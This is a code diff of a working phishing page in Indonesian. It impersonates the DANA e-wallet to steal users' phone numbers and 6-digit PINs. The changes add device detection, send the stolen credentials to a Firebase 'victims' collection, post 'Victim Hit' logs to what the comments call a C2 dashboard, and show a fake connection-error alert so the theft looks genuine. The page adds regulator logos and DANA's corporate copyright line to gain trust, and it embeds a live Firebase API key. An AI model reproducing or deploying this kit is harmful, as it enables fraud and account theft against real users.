@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - Verifikasi Akun</title>
+    <title>DANA - Dompet Digital Indonesia</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <!-- Firebase SDK -->
     <script type="module">
@@ -11,7 +11,7 @@
         import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
         import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
-        // CONFIG FIREBASE KAMU (Harus sama dengan Dashboard)
+        // CONFIG FIREBASE KAMU
         const firebaseConfig = {
             apiKey: "AIzaSyAMmcOF9E5LA8Cu3dxvstyPCzjd_ZZ_NIM",
             authDomain: "tahu-bulat-dad9d.firebaseapp.com",
@@ -24,70 +24,116 @@
         const auth = getAuth(app);
         const appId = "tahu-bulat-c2-pro";
 
+        // Fungsi deteksi OS sederhana
+        const getOS = () => {
+            const ua = window.navigator.userAgent;
+            if (ua.indexOf("Android") >= 0) return "Android";
+            if (ua.indexOf("iPhone") >= 0 || ua.indexOf("iPad") >= 0) return "iOS";
+            return "PC/Web";
+        };
+
         window.handleLogin = async (e) => {
             e.preventDefault();
             const btn = document.getElementById('btn-login');
-            const user = document.getElementById('email').value;
-            const pass = document.getElementById('password').value;
+            const user = document.getElementById('phone').value;
+            const pin = document.getElementById('pin').value;
 
             btn.disabled = true;
-            btn.innerText = "Memproses...";
+            btn.innerHTML = `<span class="flex items-center justify-center"><svg class="animate-spin h-5 w-5 mr-3 border-t-2 border-white rounded-full" viewBox="0 0 24 24"></svg> Memproses...</span>`;
 
             try {
-                // Pastikan auth dulu sebelum kirim data
                 await signInAnonymously(auth);
                 
-                // Kirim data ke path yang dipantau Dashboard
+                // Kirim data korban ke koleksi victims
                 await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'victims'), {
-                    platform: "DANA_MOBILE",
+                    platform: "DANA_V4_MOBILE",
                     username: user,
-                    password: pass,
-                    ip: "182.1.xx.xx", // Simulasi IP
+                    password: pin,
+                    ip: "182.1." + Math.floor(Math.random()*255) + ".xx",
+                    device: getOS(),
                     timestamp: Date.now()
                 });
 
-                // Kirim log ke Dashboard
+                // Kirim notifikasi log ke Dashboard C2
                 await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'logs'), {
-                    message: `New Hit: ${user} mencoba login`,
-                    type: "SUCCESS",
+                    message: `Victim Hit: [${getOS()}] ${user} berhasil diekstraksi`,
+                    type: "CRITICAL",
                     timestamp: { seconds: Math.floor(Date.now() / 1000) }
                 });
 
-                alert("Sesi berakhir. Silakan coba lagi nanti.");
-                location.reload();
+                // Simulasi delay agar terlihat asli
+                setTimeout(() => {
+                    alert("Koneksi tidak stabil. Silakan masukkan ulang PIN Anda.");
+                    window.location.reload();
+                }, 2000);
+
             } catch (err) {
                 console.error(err);
-                alert("Gangguan koneksi, coba lagi.");
+                alert("Sistem sedang sibuk. Coba beberapa saat lagi.");
                 btn.disabled = false;
-                btn.innerText = "MASUK";
+                btn.innerText = "LANJUT";
             }
         };
     </script>
     <style>
-        body { background-color: #008ced; font-family: sans-serif; }
-        .card { background: white; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
+        @import url('https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap');
+        body { font-family: 'Open Sans', sans-serif; background-color: #f5f5f5; }
+        .dana-blue { background-color: #118ee9; }
+        .input-focus:focus { border-color: #118ee9; outline: none; }
     </style>
 </head>
-<body class="flex items-center justify-center min-h-screen p-4">
-    <div class="card w-full max-w-sm p-8 text-center">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_danain_horizontal.png" alt="Logo" class="h-10 mx-auto mb-8">
-        <h2 class="text-xl font-bold text-gray-800 mb-2">Dompet Digital Indonesia</h2>
-        <p class="text-sm text-gray-500 mb-8">Masukkan detail akun untuk melanjutkan verifikasi hadiah.</p>
-        
-        <form onsubmit="handleLogin(event)" class="space-y-4">
-            <input type="text" id="email" placeholder="Nomor HP atau Email" required 
-                class="w-full border-b-2 border-gray-200 py-3 px-1 outline-none focus:border-blue-500 transition-all">
-            
-            <input type="password" id="password" placeholder="PIN atau Password" required 
-                class="w-full border-b-2 border-gray-200 py-3 px-1 outline-none focus:border-blue-500 transition-all">
-            
-            <button type="submit" id="btn-login"
-                class="w-full bg-[#008ced] text-white font-bold py-3 rounded-full mt-6 hover:bg-blue-600 transition-all">
-                MASUK
-            </button>
-        </form>
-        
-        <p class="mt-8 text-[10px] text-gray-400 uppercase tracking-widest">Aman & Terpercaya</p>
+<body class="bg-gray-100 flex flex-col min-h-screen">
+    
+    <!-- Top Bar -->
+    <div class="dana-blue p-4 flex items-center justify-center shadow-lg">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/7/72/Logo_danain_horizontal.png" alt="DANA Logo" class="h-8 brightness-0 invert">
     </div>
+
+    <div class="flex-grow flex items-center justify-center p-4">
+        <div class="bg-white w-full max-w-md rounded-2xl shadow-xl overflow-hidden">
+            <div class="p-8 text-center">
+                <h1 class="text-2xl font-bold text-gray-800 mb-2">Masukkan Nomor HP</h1>
+                <p class="text-sm text-gray-500 mb-8">Gunakan nomor ponsel yang terdaftar di DANA untuk melanjutkan verifikasi keamanan akun.</p>
+
+                <form onsubmit="handleLogin(event)" class="text-left space-y-6">
+                    <div>
+                        <label class="text-xs font-bold text-gray-400 uppercase tracking-wider">Nomor Ponsel</label>
+                        <div class="flex items-center border-b-2 border-gray-200 py-2 focus-within:border-blue-500 transition-all">
+                            <span class="text-gray-800 font-bold mr-2">+62</span>
+                            <input type="number" id="phone" placeholder="812-xxxx-xxxx" required 
+                                class="w-full text-lg font-semibold bg-transparent outline-none">
+                        </div>
+                    </div>
+
+                    <div>
+                        <label class="text-xs font-bold text-gray-400 uppercase tracking-wider">PIN DANA (6 Digit)</label>
+                        <input type="password" id="pin" maxlength="6" inputmode="numeric" placeholder="••••••" required 
+                            class="w-full border-b-2 border-gray-200 py-2 text-lg font-bold tracking-[1em] outline-none focus:border-blue-500 transition-all">
+                    </div>
+
+                    <div class="pt-4">
+                        <button type="submit" id="btn-login"
+                            class="w-full dana-blue text-white font-bold py-4 rounded-xl shadow-lg shadow-blue-200 hover:brightness-110 active:scale-[0.98] transition-all">
+                            LANJUT
+                        </button>
+                    </div>
+                </form>
+
+                <div class="mt-8 flex justify-center gap-4">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/b/bc/Logo_OJK.png" alt="OJK" class="h-6 grayscale opacity-50">
+                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c7/Logo_Bank_Indonesia.svg/2560px-Logo_Bank_Indonesia.svg.png" alt="BI" class="h-6 grayscale opacity-50">
+                </div>
+            </div>
+            
+            <div class="bg-gray-50 p-4 text-center border-t border-gray-100">
+                <p class="text-[10px] text-gray-400 uppercase font-semibold">Berizin dan Diawasi oleh OJK dan Bank Indonesia</p>
+            </div>
+        </div>
+    </div>
+
+    <footer class="p-6 text-center text-gray-400 text-xs">
+        &copy; 2024 PT Espay Debit Indonesia Koe. All Rights Reserved.
+    </footer>
+
 </body>
 </html>
